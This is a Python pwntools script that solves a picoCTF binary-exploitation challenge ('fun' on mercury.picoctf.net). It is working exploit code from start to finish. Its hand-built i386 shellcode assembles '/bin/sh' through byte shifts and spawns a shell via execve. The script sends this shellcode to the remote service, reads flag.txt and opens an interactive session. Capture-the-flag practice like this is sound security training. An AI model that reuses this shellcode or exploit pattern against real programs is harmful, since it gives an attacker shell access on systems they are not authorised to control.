#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 16610
HOST = "mercury.picoctf.net"
exe = context.binary = ELF('./fun', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b* 0x080485C9
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
shellcode = asm('''
	xor eax, eax
	add al, 0x68
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	add al, 0x73
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	add al, 0x2f
	push eax
	push eax

	xor eax, eax
	add al, 0x6e
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	add al, 0x69
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	add al, 0x62
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	shl eax, 1
	add al, 0x2f
	push eax
	push esp

	pop ebx
	pop esi

	xor eax, eax
	add al, 0xb
	xor ecx, ecx
	xor edx, edx
	int 0x80
	''', arch='i386')
# print(len(shellcode))
# GDB()
p.sendlineafter(b'\n', shellcode)
p.sendline(b'cat flag.txt')

p.interactive()